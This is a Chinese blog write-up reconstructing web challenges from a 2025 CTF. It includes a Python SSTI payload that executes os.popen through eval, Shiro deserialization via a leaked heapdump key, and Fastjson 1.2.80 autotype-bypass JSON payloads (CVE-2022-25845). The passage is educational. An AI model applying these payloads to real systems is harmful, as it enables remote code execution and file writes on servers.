@@ -1,0 +1,875 @@
+
+  <!DOCTYPE html>
+  <html lang="zh-CN"  >
+  <head>
+  <meta charset="utf-8">
+  
+
+  
+
+  
+
+  <script>window.REIMU_CONFIG = {};window.REIMU_CONFIG.icon_font = '4552607_bq08450reo';window.REIMU_CONFIG.clipboard_tips = {"success":"复制成功(*^▽^*)","fail":"复制失败 (ﾟ⊿ﾟ)ﾂ","copyright":{"enable":false,"count":50,"content":"本文版权：本博客所有文章除特别声明外，均采用 BY-NC-SA 许可协议。转载请注明出处！"}};window.REIMU_CONFIG.code_block = {"expand":true};</script>
+  
+  <title>
+    京麟CTF2025web复现 |
+    
+    KL
+  </title>
+  <meta name="viewport" content="width=device-width, initial-scale=1, shrink-to-fit=no">
+  <link rel="preconnect" href="https://fonts.gstatic.com/" crossorigin><link rel="preload" as="style" href="https://fonts.googleapis.com/css?family=Mulish:400,400italic,700,700italic%7CNoto%20Serif%20SC:400,400italic,700,700italic&display=swap"><link rel="stylesheet" href="https://fonts.googleapis.com/css?family=Mulish:400,400italic,700,700italic%7CNoto%20Serif%20SC:400,400italic,700,700italic&display=swap" media="print" onload="this.media&#x3D;&#39;all&#39;">
+  
+    <link rel="preload" href="//at.alicdn.com/t/c/font_4552607_bq08450reo.woff2" as="font" type="font/woff2" crossorigin="anonymous">
+  
+  
+    
+<link rel="stylesheet" href="/css/loader.css">
+
+  
+  
+    <meta name="description" content="没找到复现环境，直接跟着大佬的博客来复现 [TOC]  热身赛-Execute 无参数利用，读文件，发现readfile没有被ban，直接梭，或者变量拼接也可以   热身赛-EzLogin(Shiro反序列化)  发现有个记住我，抓包发现使用了Shiro，猜测有Shiro反序列化漏洞，但一把梭没梭出密钥 扫一下目录  发现使用了actuator组件 典型的heapdump泄露 利用工具整理出hea">
+<meta property="og:type" content="article">
+<meta property="og:title" content="京麟CTF2025web复现">
+<meta property="og:url" content="http://example.com/2025/08/12/%E4%BA%AC%E9%BA%92CTf2025web%E5%A4%8D%E7%8E%B0/index.html">
+<meta property="og:site_name" content="KL">
+<meta property="og:description" content="没找到复现环境，直接跟着大佬的博客来复现 [TOC]  热身赛-Execute 无参数利用，读文件，发现readfile没有被ban，直接梭，或者变量拼接也可以   热身赛-EzLogin(Shiro反序列化)  发现有个记住我，抓包发现使用了Shiro，猜测有Shiro反序列化漏洞，但一把梭没梭出密钥 扫一下目录  发现使用了actuator组件 典型的heapdump泄露 利用工具整理出hea">
+<meta property="og:locale" content="zh_CN">
+<meta property="og:image" content="http://example.com/2025/08/12/images/9fef5b6173f32621f2dc5f3f6072c442.png">
+<meta property="og:image" content="http://example.com/2025/08/12/images/cb4a2dc086e1aea03a51d46c97d5ca2b.png">
+<meta property="og:image" content="http://example.com/2025/08/12/images/1d9b02d04b10ed762054dcc9ae2cf389.png">
+<meta property="og:image" content="http://example.com/2025/08/12/images/651373d8bfb9477a0ba476ee4badab9d.png">
+<meta property="og:image" content="http://example.com/2025/08/12/images/dc98db68012142c29ed8240b3a5fbcb7.png">
+<meta property="og:image" content="http://example.com/2025/08/12/images/8dafb2f2-9e92-3180-97c9-655e3c8c29a9.png">
+<meta property="article:published_time" content="2025-08-12T10:42:06.000Z">
+<meta property="article:modified_time" content="2026-06-06T04:06:28.165Z">
+<meta property="article:author" content="FuB0Y">
+<meta property="article:tag" content="比赛复现">
+<meta property="article:tag" content="Shiro反序列化">
+<meta property="article:tag" content="fastjson高版本反序列化">
+<meta name="twitter:card" content="summary">
+<meta name="twitter:image" content="http://example.com/2025/08/12/images/9fef5b6173f32621f2dc5f3f6072c442.png">
+  
+  
+    <link rel="alternate" href="/atom.xml" title="KL" type="application/atom+xml">
+  
+  
+    <link rel="shortcut icon" href="/images/favicon.ico">
+  
+  
+<link rel="stylesheet" href="/css/style.css">
+
+  <link rel="preload" href="https://npm.webcache.cn/photoswipe@5.4.4/dist/photoswipe.css" as="style" onload="this.onload=null;this.rel='stylesheet'">
+  
+    
+      
+        
+<link rel="stylesheet" href="https://npm.webcache.cn/katex@0.16.11/dist/katex.min.css">
+
+      
+    
+  
+  
+  
+  
+    
+<script src="https://npm.webcache.cn/pace-js@1.2.4/pace.min.js" integrity="sha384-k6YtvFUEIuEFBdrLKJ3YAUbBki333tj1CSUisai5Cswsg9wcLNaPzsTHDswp4Az8" crossorigin="anonymous"></script>
+
+  
+  
+    
+<link rel="stylesheet" href="https://npm.webcache.cn/@reimujs/aos@0.1.0/dist/aos.css">
+
+  
+  
+<meta name="generator" content="Hexo 7.3.0"></head>
+
+  <body>
+    
+  <div id='loader'>
+    <div class="loading-left-bg loading-bg"></div>
+    <div class="loading-right-bg loading-bg"></div>
+    <div class="spinner-box">
+      <div class="loading-taichi">
+        
+          <svg width="150" height="150" viewBox="0 0 1024 1024" class="icon" version="1.1" xmlns="https://www.w3.org/2000/svg" shape-rendering="geometricPrecision">
+            <path d="M303.5 432A80 80 0 0 1 291.5 592A80 80 0 0 1 303.5 432z" fill="var(--red-1, #ff5252)" />
+            <path d="M512 65A447 447 0 0 1 512 959L512 929A417 417 0 0 0 512 95A417 417 0 0 0 512 929L512 959A447 447 0 0 1 512 65z 
+           M512 95A417 417 0 0 1 929 512A208.5 208.5 0 0 1 720.5 720.5L720.5 592A80 80 0 0 0 720.5 432A80 80 0 0 0 720.5 592L720.5 720.5A208.5 208.5 0 0 1 512 512A208.5 208.5 0 0 0 303.5 303.5A208.5 208.5 0 0 0 95 512A417 417 0 0 1 512 95z" fill="var(--red-1, #ff5252)" />
+          </svg>
+        
+      </div>
+      <div class="loading-word">少女祈祷中...</div>
+    </div>
+  </div>
+  </div>
+  <script>
+    var time = null;
+    var startLoading = () => {
+      time = Date.now();
+      document.getElementById('loader').classList.remove("loading");
+    }
+    var endLoading = () => {
+      if (!time) {
+        document.body.style.overflow = 'auto';
+        document.getElementById('loader').classList.add("loading");
+      } else {
+        if (Date.now() - time > 500) {
+          time = null;
+          document.body.style.overflow = 'auto';
+          document.getElementById('loader').classList.add("loading");
+        } else {
+          setTimeout(endLoading, 500 - (Date.now() - time));
+          time = null;
+        }
+      }
+    }
+    window.addEventListener('DOMContentLoaded', endLoading);
+    document.getElementById('loader').addEventListener('click', endLoading);
+  </script>
+
+<div id="copy-tooltip" style="pointer-events: none; opacity: 0; transition: all 0.2s ease; position: fixed;top: 50%;left: 50%;z-index: 999;transform: translate(-50%, -50%);color: white;background: rgba(0, 0, 0, 0.5);padding: 10px 15px;border-radius: 10px;">
+</div>
+
+
+    <div id="container">
+      <div id="wrap">
+        <div id="header-nav">
+  <nav id="main-nav">
+    
+      
+        <span class="main-nav-link-wrap">
+          <div class="main-nav-icon icon rotate">
+            &#xe62b;
+          </div>
+          <a class="main-nav-link" href="/">首页</a>
+        </span>
+      
+        <span class="main-nav-link-wrap">
+          <div class="main-nav-icon icon rotate">
+            &#xe62b;
+          </div>
+          <a class="main-nav-link" href="/archives">归档</a>
+        </span>
+      
+        <span class="main-nav-link-wrap">
+          <div class="main-nav-icon icon rotate">
+            &#xe62b;
+          </div>
+          <a class="main-nav-link" href="/about">关于</a>
+        </span>
+      
+        <span class="main-nav-link-wrap">
+          <div class="main-nav-icon icon rotate">
+            &#xe62b;
+          </div>
+          <a class="main-nav-link" href="/friend">友链</a>
+        </span>
+      
+    
+    <a id="main-nav-toggle" class="nav-icon"></a>
+  </nav>
+  <nav id="sub-nav">
+    
+      <a id="nav-rss-link" class="nav-icon" href="/atom.xml" title="RSS 订阅" target="_blank"></a>
+    
+    
+    
+  </nav>
+</div>
+<header id="header">
+  
+    <picture>
+      
+    </picture>
+    
+      <img fetchpriority="high" src="/images/banner.webp" alt="京麟CTF2025web复现">
+    
+  
+  <div id="header-outer">
+    <div id="header-title">
+      
+        
+        
+          <a href="/" id="logo">
+            <h1 data-aos="slide-up">京麟CTF2025web复现</h1>
+          </a>
+        
+      
+      
+        
+        <h2 id="subtitle-wrap" data-aos="slide-down">
+          
+        </h2>
+      
+    </div>
+  </div>
+</header>
+
+        <div id="content"  class="sidebar-right" >
+          <aside id="sidebar">
+  
+  
+  <div class="sidebar-wrapper wrap-sticky">
+    <div class="sidebar-wrap" data-aos="fade-up">
+      
+        <div class="sidebar-toc-sidebar"><div class="sidebar-toc">
+  <h3 class="toc-title">文章目录</h3>
+  <div class="sidebar-toc-wrapper toc-div-class" >
+      
+        <ol class="toc"><li class="toc-item toc-level-2"><a class="toc-link" href="#%E7%83%AD%E8%BA%AB%E8%B5%9B-execute"><span class="toc-number">1.</span> <span class="toc-text"> 热身赛-Execute</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E7%83%AD%E8%BA%AB%E8%B5%9B-ezloginshiro%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96"><span class="toc-number">2.</span> <span class="toc-text"> 热身赛-EzLogin(Shiro反序列化)</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E5%88%9D%E8%B5%9B-%E8%AE%A1%E7%AE%97%E5%99%A8"><span class="toc-number">3.</span> <span class="toc-text"> 初赛-计算器</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E5%88%9D%E8%B5%9B-fastj"><span class="toc-number">4.</span> <span class="toc-text"> 初赛-FastJ</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#%E5%89%8D%E7%BD%AE%E7%9F%A5%E8%AF%86"><span class="toc-number">4.1.</span> <span class="toc-text"> 前置知识</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#fastjson%E7%9A%84autotypecheck%E6%9C%BA%E5%88%B6"><span class="toc-number">4.1.1.</span> <span class="toc-text"> fastjson的“AutoTypeCheck”机制</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#fastjson%E7%9A%84%E7%B1%BB%E7%BC%93%E5%AD%98%E6%9C%BA%E5%88%B6"><span class="toc-number">4.1.2.</span> <span class="toc-text"> fastjson的类缓存机制</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#rmb"><span class="toc-number">4.1.3.</span> <span class="toc-text"> rmb</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#inflateroutputstream"><span class="toc-number">4.1.4.</span> <span class="toc-text"> InflaterOutputStream</span></a></li></ol></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E8%A7%A3%E9%A2%98"><span class="toc-number">4.2.</span> <span class="toc-text"> 解题</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#%E6%BC%8F%E6%B4%9Edemo-fastjson1280%E7%9A%84%E4%BB%BB%E6%84%8F%E5%86%99%E5%88%A9%E7%94%A8"><span class="toc-number">4.2.1.</span> <span class="toc-text"> ‍漏洞Demo-Fastjson1.2.80的任意写利用</span></a><ol class="toc-child"><li class="toc-item toc-level-5"><a class="toc-link" href="#step1-%E6%8A%8Ajavaioinputstream-%E5%8A%A0%E5%85%A5-fastjson-autotype-%E7%BC%93%E5%AD%98"><span class="toc-number">4.2.1.1.</span> <span class="toc-text"> Step1: 把java.io.InputStream 加入 fastjson autotype 缓存</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#step2-file%E5%8D%8F%E8%AE%AE%E8%AF%BB%E5%8F%96tmp%E5%86%85%E5%AE%B9%E8%8E%B7%E5%8F%96tomcat%E7%9A%84docbase%E6%96%87%E4%BB%B6%E5%90%8D%E7%A7%B0"><span class="toc-number">4.2.1.2.</span> <span class="toc-text"> Step2: file协议读取&#x2F;tmp内容，获取tomcat的docbase文件名称</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#step3-%E5%86%99%E5%85%A5%E6%81%B6%E6%84%8F%E5%AD%97%E8%8A%82%E7%A0%81%E5%88%B0docbase%E7%9B%AE%E5%BD%95%E4%B8%8B"><span class="toc-number">4.2.1.3.</span> <span class="toc-text"> Step3: 写入恶意字节码到docbase目录下</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#step4-%E8%A7%A6%E5%8F%91%E6%81%B6%E6%84%8F%E7%B1%BB%E5%8A%A0%E8%BD%BD"><span class="toc-number">4.2.1.4.</span> <span class="toc-text"> Step4: 触发恶意类加载</span></a></li></ol></li><li class="toc-item toc-level-4"><a class="toc-link" href="#exp"><span class="toc-number">4.2.2.</span> <span class="toc-text"> EXP</span></a></li></ol></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E6%84%9F%E6%83%B3"><span class="toc-number">5.</span> <span class="toc-text"> 感想</span></a></li></ol>
+      
+  </div>
+</div>
+</div>
+        <div class="sidebar-common-sidebar hidden"><div class="sidebar-author">
+  <img data-src="/avatar/avatar.jpg" data-sizes="auto" alt="FuB0Y" class="lazyload">
+  <div class="sidebar-author-name">FuB0Y</div>
+  <div class="sidebar-description">世所谓英雄者，不以挫抑而灰心，不以失败而退怯</div>
+</div>
+<div class="sidebar-state">
+  <div class="sidebar-state-article">
+    <div>文章</div>
+    <div class="sidebar-state-number">396</div>
+  </div>
+  <div class="sidebar-state-category">
+    <div>分类</div>
+    <div class="sidebar-state-number">13</div>
+  </div>
+  <div class="sidebar-state-tag">
+    <div>标签</div>
+    <div class="sidebar-state-number">327</div>
+  </div>
+</div>
+<div class="sidebar-social">
+  
+</div>
+<div class="sidebar-menu">
+  
+    
+      <div class="sidebar-menu-link-wrap">
+        <a class="sidebar-menu-link-dummy" href="/" aria-label="首页"></a>
+        <div class="sidebar-menu-icon icon rotate">
+          &#xe62b;
+        </div>
+        <div class="sidebar-menu-link">首页</div>
+      </div>
+    
+      <div class="sidebar-menu-link-wrap">
+        <a class="sidebar-menu-link-dummy" href="/archives" aria-label="归档"></a>
+        <div class="sidebar-menu-icon icon rotate">
+          &#xe62b;
+        </div>
+        <div class="sidebar-menu-link">归档</div>
+      </div>
+    
+      <div class="sidebar-menu-link-wrap">
+        <a class="sidebar-menu-link-dummy" href="/about" aria-label="关于"></a>
+        <div class="sidebar-menu-icon icon rotate">
+          &#xe62b;
+        </div>
+        <div class="sidebar-menu-link">关于</div>
+      </div>
+    
+      <div class="sidebar-menu-link-wrap">
+        <a class="sidebar-menu-link-dummy" href="/friend" aria-label="友链"></a>
+        <div class="sidebar-menu-icon icon rotate">
+          &#xe62b;
+        </div>
+        <div class="sidebar-menu-link">友链</div>
+      </div>
+    
+  
+</div>
+</div>
+      
+      
+        <div class="sidebar-btn-wrapper" style="position:static">
+          <div class="sidebar-toc-btn current"></div>
+          <div class="sidebar-common-btn"></div>
+        </div>
+      
+    </div>
+  </div>
+
+  <div class="sidebar-widget">
+  
+  </div>
+</aside>
+
+          <section id="main"><article id="post-京麒CTf2025web复现" class="h-entry article article-type-post" itemprop="blogPost" itemscope itemtype="https://schema.org/BlogPosting">
+  <div class="article-inner" data-aos="fade-up">
+    <div class="article-meta">
+      <div class="article-date">
+  <a href="/2025/08/12/%E4%BA%AC%E9%BA%92CTf2025web%E5%A4%8D%E7%8E%B0/" class="article-date-link" data-aos="zoom-in">
+    <time datetime="2025-08-12T10:42:06.000Z" itemprop="datePublished">2025-08-12</time>
+    <time style="display: none;" id="post-update-time">2026-06-06</time>
+  </a>
+</div>
+
+      
+  <div class="article-category">
+    <a class="article-category-link" href="/categories/%E6%AF%94%E8%B5%9B%E5%A4%8D%E7%8E%B0/" data-aos="zoom-in">比赛复现</a>
+  </div>
+
+
+    </div>
+    <div class="hr-line"></div>
+    
+
+    <div class="e-content article-entry" itemprop="articleBody">
+      
+      
+        <p>没找到复现环境，直接跟着大佬的博客来复现</p>
+<p>[TOC]</p>
+<h2 id="热身赛-execute"><a class="markdownIt-Anchor" href="#热身赛-execute"></a> 热身赛-Execute</h2>
+<p>无参数利用，<a target="_blank" rel="noopener" href="https://so.csdn.net/so/search?q=%E8%AF%BB%E6%96%87%E4%BB%B6&amp;spm=1001.2101.3001.7020">读文件</a>，发现readfile没有被ban，直接梭，或者变量拼接也可以</p>
+<p><img src="../images/9fef5b6173f32621f2dc5f3f6072c442.png" alt="img" /></p>
+<h2 id="热身赛-ezloginshiro反序列化"><a class="markdownIt-Anchor" href="#热身赛-ezloginshiro反序列化"></a> 热身赛-EzLogin(Shiro反序列化)</h2>
+<p><img src="../images/cb4a2dc086e1aea03a51d46c97d5ca2b.png" alt="img" /></p>
+<p>发现有个记住我，抓包发现使用了Shiro，猜测有Shiro反序列化漏洞，但一把梭没梭出密钥</p>
+<p>扫一下目录</p>
+<p><img src="../images/1d9b02d04b10ed762054dcc9ae2cf389.png" alt="img" /></p>
+<p>发现使用了actuator组件</p>
+<p>典型的heapdump泄露</p>
+<p>利用工具整理出heapdump文件中的密钥：<br />
+<img src="../images/651373d8bfb9477a0ba476ee4badab9d.png" alt="img" /></p>
+<p>然后利用Shiro反序列化工具一把梭即可</p>
+<h2 id="初赛-计算器"><a class="markdownIt-Anchor" href="#初赛-计算器"></a> 初赛-计算器</h2>
+<p>题目要求输入密码来解锁计算器自定义<a target="_blank" rel="noopener" href="https://so.csdn.net/so/search?q=%E8%A1%A8%E8%BE%BE%E5%BC%8F&amp;spm=1001.2101.3001.7020">表达式</a>功能,默认为1+1</p>
+<p>删去disable字段</p>
+<p><img src="../images/dc98db68012142c29ed8240b3a5fbcb7.png" alt="img" /></p>
+<p>现在就可以自定义输入了</p>
+<p>然后就是一个SSTI的漏洞</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&#x27;&#x27;.__class__.__mro__[1].__subclasses__()[80].__init__.__globals__[&#x27;__builtins__&#x27;][&#x27;eval&#x27;](&#x27;__import__(&quot;os&quot;).popen(&quot;env&quot;).read()&#x27;)</span><br></pre></td></tr></table></figure>
+<p>flag在环境变量中</p>
+<p>这是非预期，预期是<a target="_blank" rel="noopener" href="https://blog.csdn.net/weixin_59166557/article/details/148202808%EF%BC%8C%E6%88%91%E7%9C%8B%E4%B8%8D%E6%87%82%E3%80%82%E3%80%82%E3%80%82">https://blog.csdn.net/weixin_59166557/article/details/148202808，我看不懂。。。</a></p>
+<h2 id="初赛-fastj"><a class="markdownIt-Anchor" href="#初赛-fastj"></a> 初赛-FastJ</h2>
+<p>重点来了，其实复现这个比赛就说奔着它来的</p>
+<h3 id="前置知识"><a class="markdownIt-Anchor" href="#前置知识"></a> 前置知识</h3>
+<h4 id="fastjson的autotypecheck机制"><a class="markdownIt-Anchor" href="#fastjson的autotypecheck机制"></a> fastjson的“AutoTypeCheck”机制</h4>
+<p>Fastjson 从1.2.68开始引入白名单，在 1.2.80 中更加严格。只有在 <strong>白名单</strong> 中的类才能通过 @type 被反序列化。</p>
+<ul>
+<li>
+<p>一些常见 Java 基础类，例如：</p>
+</li>
+<li>
+<ul>
+<li><code>java.util.HashMap</code></li>
+</ul>
+</li>
+<li>
+<ul>
+<li><code>java.util.ArrayList</code></li>
+</ul>
+</li>
+<li>
+<ul>
+<li><code>java.lang.Integer</code></li>
+</ul>
+</li>
+<li>
+<ul>
+<li><code>java.lang.String</code></li>
+</ul>
+</li>
+<li>
+<p>特定配置下用户添加的类（通过 <code>ParserConfig.addAccept(&quot;com.example.&quot;)</code>）</p>
+</li>
+<li>
+<p>特定第三方库被明示允许的类（比如某些 JSON 处理类）</p>
+</li>
+</ul>
+<p>不再支持自动根据 @type 加载任意类。</p>
+<h4 id="fastjson的类缓存机制"><a class="markdownIt-Anchor" href="#fastjson的类缓存机制"></a> fastjson的类缓存机制</h4>
+<p>Fastjson的类缓存机制：<code>ParserConfig.classMapping</code></p>
+<p>当使用 @type 加载了一个类，Fastjson 会把它缓存起来：</p>
+<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">classMapping.put(typeName, clazz);</span><br></pre></td></tr></table></figure>
+<p>这是为了提升解析性能、减少重复反射。</p>
+<p>所以，<strong>只要你通过</strong> <strong>@type</strong> <strong>加载了某个类</strong>，Fastjson 后续就可以：</p>
+<ul>
+<li>
+<p>复用这个 Class 实例</p>
+</li>
+<li>
+<p>不再检查autoType（因为已经被认为是“合法的”了）</p>
+</li>
+</ul>
+<p>缓存机制由来：</p>
+<ul>
+<li>
+<p>该机制很早就有（至少在 1.2.6+ 就存在），本是出于性能目的</p>
+</li>
+<li>
+<p>后来被用于各种 Gadget 利用链中作为“class 引导缓存”技巧</p>
+</li>
+</ul>
+<h4 id="rmb"><a class="markdownIt-Anchor" href="#rmb"></a> rmb</h4>
+<p><strong>RMI-Based MarshalOutputStream</strong></p>
+<p>是 JDK 自带的一个类：<code>sun.rmi.server.MarshalOutputStream</code></p>
+<ul>
+<li>
+<p>ObjectOutputStream 的子类；</p>
+</li>
+<li>
+<p>在对象序列化过程中，<strong>会调用其内部 OutputStream 的 write 方法</strong>；</p>
+</li>
+<li>
+<p>是 JDK RMI 模块中用于序列化对象时的工具类。</p>
+</li>
+</ul>
+<p>可以利用反序列化触发 write()，实现数据流写入</p>
+<h4 id="inflateroutputstream"><a class="markdownIt-Anchor" href="#inflateroutputstream"></a> InflaterOutputStream</h4>
+<p>标准 JDK 类，负责接收压缩数据 → 解压 → 向底层流写入</p>
+<h3 id="解题"><a class="markdownIt-Anchor" href="#解题"></a> 解题</h3>
+<p><code>fastjson</code>版本为<code>1.2.80</code></p>
+<p>‍核心代码为</p>
+<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// IndexController.java</span></span><br><span class="line"><span class="meta">@RestController</span></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">IndexController</span> &#123;</span><br><span class="line">    <span class="meta">@RequestMapping(value=&#123;&quot;/&quot;&#125;)</span></span><br><span class="line">    <span class="keyword">public</span> Object <span class="title function_">fastj</span><span class="params">(String json)</span> &#123; </span><br><span class="line">        <span class="keyword">if</span> (json == <span class="literal">null</span>) &#123;</span><br><span class="line">            <span class="keyword">return</span> JSON.toJSONString((Object)<span class="string">&quot;json is null&quot;</span>);</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">try</span> &#123;</span><br><span class="line">            <span class="keyword">return</span> JSON.parse((String)json);  <span class="comment">// Fastjson.parse，会尝试解析 @type 并实例化对象</span></span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">catch</span> (Exception e) &#123;</span><br><span class="line">            <span class="keyword">return</span> e.toString();</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">private</span> <span class="keyword">void</span> <span class="title function_">getflag</span><span class="params">()</span> <span class="keyword">throws</span> FileNotFoundException &#123;</span><br><span class="line">        <span class="keyword">new</span> <span class="title class_">FilterFileOutputStream</span>(<span class="string">&quot;/flag&quot;</span>, <span class="string">&quot;/&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// FilterFileOutputStream.java</span></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">FilterFileOutputStream</span></span><br><span class="line"><span class="keyword">extends</span> <span class="title class_">FileOutputStream</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="title function_">FilterFileOutputStream</span><span class="params">(String name, String prefix)</span> <span class="keyword">throws</span> FileNotFoundException &#123;</span><br><span class="line">        <span class="built_in">super</span>(name);</span><br><span class="line">        <span class="keyword">if</span> (!name.startsWith(prefix)) &#123;</span><br><span class="line">            <span class="keyword">return</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+<p>调用<code>getflag()</code>会触发<code>new FilterFileOutputStream(&quot;/flag&quot;, &quot;/&quot;);</code>将触发调用<code>FilterFileOutputStream</code>类，构造函数调用 <code>super(name)</code> ➜ 调用了 <code>FileOutputStream(String name)</code> ➜ <strong>会尝试打开或新建这个文件</strong></p>
+<p>试探一下<code>autotype</code>是否开启</p>
+<figure class="highlight json"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="punctuation">&#123;</span></span><br><span class="line">  <span class="attr">&quot;@type&quot;</span><span class="punctuation">:</span><span class="string">&quot;java.lang.Exception&quot;</span><span class="punctuation">,</span></span><br><span class="line">  <span class="attr">&quot;detailMessage&quot;</span><span class="punctuation">:</span><span class="string">&quot;test&quot;</span></span><br><span class="line"><span class="punctuation">&#125;</span></span><br></pre></td></tr></table></figure>
+<p>开启。那就可以借助<code>Fastjson</code> 的反序列化能力，构造这样一个对象：</p>
+<figure class="highlight json"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="punctuation">&#123;</span></span><br><span class="line">  <span class="attr">&quot;@type&quot;</span><span class="punctuation">:</span> <span class="string">&quot;your.pkg.FilterFileOutputStream&quot;</span><span class="punctuation">,</span></span><br><span class="line">  <span class="attr">&quot;name&quot;</span><span class="punctuation">:</span> <span class="string">&quot;/flag&quot;</span><span class="punctuation">,</span></span><br><span class="line">  <span class="attr">&quot;prefix&quot;</span><span class="punctuation">:</span> <span class="string">&quot;/&quot;</span></span><br><span class="line"><span class="punctuation">&#125;</span></span><br></pre></td></tr></table></figure>
+<p>但存在<code>“AutoTypeCheck”</code>机制，由于 <code>FilterFileOutputStream</code> 不在白名单中，<strong>无法被正常反序列化</strong></p>
+<p>‍关于FastJson 1.2.80的利用，找到CVE-2022-25845</p>
+<p><a target="_blank" rel="noopener" href="https://jfrog.com/blog/cve-2022-25845-analyzing-the-fastjson-auto-type-bypass-rce-vulnerability/">CVE-2022-25845 - Fastjson RCE 漏洞分析</a></p>
+<p>该漏洞的核心在于<strong>只要目标类继承了<code>Throwable</code>类，Fastjson就能反序列化这个目标类。</strong></p>
+<p><code>Throwable</code> 是所有异常类的基类，而 <code>InputCoercionException</code> 继承了 <code>JsonProcessingException</code> → <code>IOException</code> → <code>Exception</code> → <code>Throwable</code></p>
+<h4 id="漏洞demo-fastjson1280的任意写利用"><a class="markdownIt-Anchor" href="#漏洞demo-fastjson1280的任意写利用"></a> ‍漏洞Demo-Fastjson1.2.80的任意写利用</h4>
+<p><a target="_blank" rel="noopener" href="https://github.com/luelueking/CVE-2022-25845-In-Spring">luelueking/CVE-2022-25845-In-Spring: CVE-2022-25845(fastjson1.2.80) exploit in Spring Env!</a></p>
+<p>该项目是一个把<code>java.io.InputStream</code>加入<code>fastjson autotype</code> 缓存的demo，简单看看这个项目</p>
+<p>通过这个poc可以得知，通过Exception期望类可以缓存一些新类，然后上面能缓存<code>InputStream</code>：</p>
+<h5 id="step1-把javaioinputstream-加入-fastjson-autotype-缓存"><a class="markdownIt-Anchor" href="#step1-把javaioinputstream-加入-fastjson-autotype-缓存"></a> Step1: 把java.io.InputStream 加入 fastjson autotype 缓存</h5>
+<figure class="highlight json"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="punctuation">&#123;</span></span><br><span class="line">  <span class="attr">&quot;a&quot;</span><span class="punctuation">:</span> <span class="string">&quot;&#123;    \&quot;@type\&quot;: \&quot;java.lang.Exception\&quot;,    \&quot;@type\&quot;: \&quot;com.fasterxml.jackson.core.exc.InputCoercionException\&quot;,    \&quot;p\&quot;: &#123;    &#125;  &#125;&quot;</span><span class="punctuation">,</span></span><br><span class="line">  <span class="attr">&quot;b&quot;</span><span class="punctuation">:</span> <span class="punctuation">&#123;</span></span><br><span class="line">    <span class="attr">&quot;$ref&quot;</span><span class="punctuation">:</span> <span class="string">&quot;$.a.a&quot;</span></span><br><span class="line">  <span class="punctuation">&#125;</span><span class="punctuation">,</span></span><br><span class="line">  <span class="attr">&quot;c&quot;</span><span class="punctuation">:</span> <span class="string">&quot;&#123;  \&quot;@type\&quot;: \&quot;com.fasterxml.jackson.core.JsonParser\&quot;,  \&quot;@type\&quot;: \&quot;com.fasterxml.jackson.core.json.UTF8StreamJsonParser\&quot;,  \&quot;in\&quot;: &#123;&#125;&#125;&quot;</span><span class="punctuation">,</span></span><br><span class="line">  <span class="attr">&quot;d&quot;</span><span class="punctuation">:</span> <span class="punctuation">&#123;</span></span><br><span class="line">    <span class="attr">&quot;$ref&quot;</span><span class="punctuation">:</span> <span class="string">&quot;$.c.c&quot;</span></span><br><span class="line">  <span class="punctuation">&#125;</span></span><br><span class="line"><span class="punctuation">&#125;</span></span><br></pre></td></tr></table></figure>
+<p><code>&quot;$.a.a&quot;</code> 表示：</p>
+<ul>
+<li>从 JSON 根（<code>$</code>）开始，取 <code>a</code> 下的 <code>a</code> 属性</li>
+<li>如果 <code>a</code> 反序列化后变成一个对象，并且对象里有个字段 <code>a</code>，这里就直接引用那个字段的对象，而不是新建。</li>
+</ul>
+<p>其核心链条：</p>
